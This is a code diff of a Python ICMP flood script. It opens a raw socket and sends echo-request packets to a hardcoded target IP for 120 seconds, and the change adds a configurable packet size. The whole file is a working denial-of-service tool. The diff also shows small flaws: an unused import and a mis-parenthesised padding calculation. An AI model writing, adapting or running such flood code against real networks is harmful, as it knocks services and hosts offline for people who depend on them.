@@ -1,23 +1,24 @@
+from ctypes.wintypes import tagRECT
 import socket
-import random
 import struct
 import sys
 import time
 
-def icmp_flood(target_ip, duration):
+def icmp_flood(target_ip, duration, packet_size):
     sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
     timeout = time.time() + duration
-
     while time.time() < timeout:
-        packet = create_icmp_packet()
+        packet = create_icmp_packet(packet_size)
         sock.sendto(packet, (target_ip, 0))
 
-def create_icmp_packet():
-    Header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
-    data = b'ABCDEFGHIJKLMNOPQRSTUVWX'
-    cksum = calculate_checksum(Header + data)
-    Header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
-    return Header + data
+
+def create_icmp_packet(packet_size):
+    header = struct.pack('!BBHHH', 8, 0, 0, 100, 1)
+    #data = b'ABCDEFGHIJKLMNOPQRSTUVWX'[:packet_size]
+    data = (b'ABCDEFGHIJKLMNOPQRSTUVWX' * (packet_size-7 // 24 + 1))[:packet_size-7]
+    cksum = calculate_checksum(header + data)
+    header = struct.pack('!BBHHH', 8, 0, cksum, 100, 1)
+    return header + data
 
 def calculate_checksum(data):
     checksum = 0
@@ -41,6 +42,15 @@ def calculate_checksum(data):
     return checksum
 
 if __name__ == '__main__':
-    target_ip = '192.168.1.70'
-    duration = 120
-    icmp_flood(target_ip, duration)
+    #if len(sys.argv) < 4:
+    #    print("Usage: python filename.py target_ip duration packet_size")
+    #    sys.exit(1)
+
+    #target_ip = sys.argv[1]
+    #duration = int(sys.argv[2])
+    #packet_size = int(sys.argv[3])
+    target_ip='192.168.1.1'
+    duration=120
+    packet_size=65 #data+header
+
+    icmp_flood(target_ip, duration, packet_size)
